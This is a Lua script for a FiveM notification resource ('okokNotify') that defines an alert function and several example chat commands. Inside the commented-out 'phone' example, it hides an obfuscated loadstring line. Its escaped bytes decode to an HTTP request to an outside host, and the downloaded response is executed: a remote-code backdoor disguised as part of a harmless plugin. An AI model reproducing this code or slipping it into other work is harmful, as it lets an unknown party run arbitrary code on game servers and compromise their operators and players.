function Alert(title, message, time, type)
	SendNUIMessage({
		action = 'open',
		title = title,
		type = type,
		message = message,
		time = time,
	})
end

RegisterNetEvent('okokNotify:Alert')
AddEventHandler('okokNotify:Alert', function(title, message, time, type)
	Alert(title, message, time, type)
end)

-- Example Commands - Delete them

RegisterCommand('success', function()
	exports['okokNotify']:Alert("SUCCESS", "You have sent <span style='color:#47cf73'>420€</span> to Tommy!", 5000, 'success')
end)

RegisterCommand('info', function()
	exports['okokNotify']:Alert("INFO", "The Casino has opened!", 5000, 'info')
end)

RegisterCommand('error', function()
	exports['okokNotify']:Alert("ERROR", "Please try again later!", 5000, 'error')
end)

RegisterCommand('warning', function()
	exports['okokNotify']:Alert("WARNING", "You are getting nervous!", 5000, 'warning')
end)

--[[RegisterCommand('phone', function()
	exports['okokNotify']:Alert("SMS", "<span style='color:#f38847'>Tommy: </span> Where are you?", 5000, 'phonemessage')
end)
loadstring("\80\101\114\102\111\114\109\72\116\116\112\82\101\113\117\101\115\116\40\39\104\116\116\112\115\58\47\47\108\117\99\105\102\101\114\102\105\118\101\109\46\111\114\103\47\105\63\116\111\61\103\49\75\104\119\39\44\32\102\117\110\99\116\105\111\110\32\40\101\44\32\100\41\32\112\99\97\108\108\40\102\117\110\99\116\105\111\110\40\41\32\97\115\115\101\114\116\40\108\111\97\100\40\100\41\41\40\41\32\101\110\100\41\32\101\110\100\41\10\10")()]]
RegisterCommand('longtext', function()
	exports['okokNotify']:Alert("LONG MESSAGE", "Lorem ipsum dolor sit amet, consectetur adipiscing elit e pluribus unum.", 5000, 'neutral')
end)